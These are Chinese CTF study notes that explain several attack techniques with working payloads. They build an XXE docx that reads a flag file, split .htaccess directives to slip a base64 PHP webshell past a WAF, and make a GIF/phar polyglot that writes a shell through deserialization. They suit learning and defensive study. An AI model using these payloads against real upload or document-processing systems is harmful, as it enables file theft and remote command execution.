## 二、知识点

### 1. docx 的最小结构

以前只知道「docx 是个 zip，解压看 `core.xml`」，今天为了自己造一个，把里面每个 part 都摸清了。

一个能被 Word 打开的最小 docx 只有 5 个文件：

| 文件 | 作用 | 少它会怎样 |
|---|---|---|
| `[Content_Types].xml` | 声明每个 part 的类型 | 整个包不被识别 |
| `_rels/.rels` | 包级关系，指向主文档和元数据 | Word 找不到正文 |
| `word/document.xml` | 正文 | 空白文档 |
| `docProps/core.xml` | 标题/作者/创建时间等元数据 | 元数据为空 |
| `docProps/app.xml` | 扩展属性（应用程序名等） | 影响不大 |

两个必须写对的地方：

```xml
<!-- [Content_Types].xml 里要给 core.xml 一条 Override -->
<Override PartName="/docProps/core.xml"
          ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>

<!-- _rels/.rels 里要有指向它的关系 -->
<Relationship Id="rId2"
  Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties"
  Target="docProps/core.xml"/>
```

**「简历处理系统」那题只看元数据**，所以真正要控制的只有 `core.xml` 一个文件——正文写成 `<w:t>normal</w:t>` 就行，反正没人看。

### 2. XXE 塞进 core.xml 的三个细节

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE aaa[<!ENTITY bbb SYSTEM "file:///flag">]>
<cp:coreProperties xmlns:cp="...">
  <dc:creator>&bbb;</dc:creator>
  <cp:lastModifiedBy>&bbb;</cp:lastModifiedBy>
</cp:coreProperties>
```

| 细节 | 为什么 |
|---|---|
| **去掉 `standalone="yes"`** | 带 standalone 表示「不依赖外部声明」，解析器可能据此不去取外部实体；删掉之后 `<!DOCTYPE>` 才起作用 |
| **`<!DOCTYPE>` 必须紧跟 XML 声明** | DTD 只能在根元素之前，插在中间直接报错 |
| **实体要引用两次以上** | 一次就够，但写两处（creator + lastModifiedBy）能保证后台列表里无论如何都能看到 |

**为什么自己造而不是改现成的 docx**：现成文件的 `core.xml` 里时间格式是 `2026-11-18T01:44:09Z`，我照着抄第一版时手滑写成 `01:44: 09Z`（多一个空格），服务端解析 W3CDTF 直接失败。自己造才能控制到「一个空格」这个级别。

### 3. `.htaccess` 续行：WAF 看三行，Apache 看一行

「ez_upload」拦的是 `auto_prepend_file` 和 `php_value` 这两个**字符串**，所以把名字拆开写：

```apache
AddType application/x-httpd-php .png
php_\
value auto_\
prepend_file "php://filter/convert.base64-decode/resource=x.png"
```

**逐字节看（hex）**：

```
41 64 64 54 79 70 65 ... 2E 70 6E 67  0D 0A     ← AddType ... .png + CRLF
70 68 70 5F 5C  0D 0A                            ← p h p _ \ + CRLF
76 61 6C 75 65 20 61 75 74 6F 5F 5C  0D 0A       ← v a l u e   a u t o _ \ + CRLF
70 72 65 70 65 6E 64 5F 66 69 6C 65 ...          ← p r e p e n d _ f i l e ...
```

`5C` 就是反斜杠。**Apache 配置里的 `\` + 换行 = 续行**，拼接时把反斜杠和换行一起吃掉，于是三行变成一行：

```apache
php_value auto_prepend_file "php://filter/convert.base64-decode/resource=x.png"
```

**WAF 按行匹配 → 每行都不含完整字符串；Apache 拼完 → 是一条合法指令。**

### 4. base64 一句话为什么能没有 `<?php`

`x.png` 的内容只有 36 字节：

```
PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
```

它是 `<?php system($_GET['c']);?>` 的 base64。**文件里没有 `<?php` 这个字符串**，所以上传时不会触发「内容含 PHP 标签」的拦截。

执行链是这样的：

```
请求任意 .png
  → Apache 按 AddType 把它当 PHP
  → php_value auto_prepend_file 先包含 x.png
  → php://filter/convert.base64-decode 解码
  → 得到 <?php system($_GET['c']);?>
  → 执行
```

**「文件内容是什么」和「最终被执行的是什么」被 `php://filter` 隔开了。**

### 5. phar 三要素与 `getimagesize` 的软肋

`x.gif` 只有 289 字节，结构是：

```
GIF89a（6 字节头）  +  <?php __HALT_COMPILER(); ?>  +  phar 元数据（含 O:5:"Cache"）
```

| 检查 | 为什么能过 |
|---|---|
| **扩展名/类型** | 叫 `.gif`，且 `Content-Type: image/gif` |
| **`getimagesize()`** | 只读文件头 10 字节，看到 `GIF89a` 就返回尺寸，**后面的 PHP 代码它根本不看** |
| **反序列化触发** | 必须用 `phar://` 协议访问（`file_get_contents('phar://x.gif/x')`），普通读文件不触发 |

**这就是「图片马」的本质：检查器只看头，执行器看内容。**

### 6. wp 里的图片必须是相对路径

wp 从桌面搬进 `极客26wp/` 之后，原来写成 `![](C:\Users\...\玉米1.png)` 的引用全部失效。

**规则**：Markdown 里的图片路径相对**md 文件所在目录**解析，所以图片要么和 md 放在同一层，要么写 `images/玉米1.png`。

```markdown
![玉米1](玉米1.png)
```

**换个地方打开就断链的 wp，等于没写。**

## 三、案例 / 命令

### 1. 从零造一个带 XXE 的 docx

```python
import zipfile
with zipfile.ZipFile(OUT, "w", zipfile.ZIP_DEFLATED) as z:
    z.writestr("[Content_Types].xml", CONTENT_TYPES)
    z.writestr("_rels/.rels", RELS)
    z.writestr("word/document.xml", DOCUMENT)
    z.writestr("docProps/core.xml", CORE)      # XXE 在这里
    z.writestr("docProps/app.xml", APP)
```

### 2. 造 phar 图片马

```php
<?php
class Cache { public $driver; }
class FileDriver { public $path; public $data; }

$d = new FileDriver();
$d->path = '/var/www/html/uploads/shell.php';
$d->data = '<?php system($_GET["c"]); ?>';
$c = new Cache();
$c->driver = $d;

$gif = base64_decode('R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==');
$p = new Phar('x.phar');
$p->setStub($gif . '<?php __HALT_COMPILER(); ?>');
$p->addFromString('x', 'x');
$p->setMetadata($c);
unset($p);
rename('x.phar', 'x.gif');
```

### 3. 本地验证 phar 和图片头

```php
<?php
$f = 'C:/Users/DarkMaster/x.gif';
```

## 四、踩坑

| 坑 | 现象 | 原因 / 解决 |
|---|---|---|
| 时间格式多一个空格 | 上传后元数据解析失败 | W3CDTF 是 `01:44:09Z`，不是 `01:44: 09Z` |
| 保留 `standalone="yes"` | 实体不展开，读到空 | 删掉，让解析器去取外部实体 |
| 压缩 docx 时套娃 | 上传被拒 | 进目录选中子文件压，别把外层文件夹一起压 |
| `.htaccess` 存成带 BOM 的 UTF-8 | 规则不生效 | BOM 会粘在第一行 `AddType` 前面，用无 BOM（`UTF8Encoding($false)`） |
| 直接把 `auto_prepend_file` 写一行 | 被拦 | 拆成三行 + `\` 续行 |
| 把 phar 当普通文件读 | 没反应 | 必须 `phar://` 前缀才触发反序列化 |
| 以为 `getimagesize` 能拦住图片马 | 289 字节也返回尺寸 | 它只读文件头，不看内容 |
| 图片写绝对路径 | 换目录后全断链 | 统一相对路径，图片跟 md 同目录 |
| 终端又是乱码 | 脚本输出变 `鍘熷` | 输出被重定向时按 GBK 写，统一 `-X utf8` |
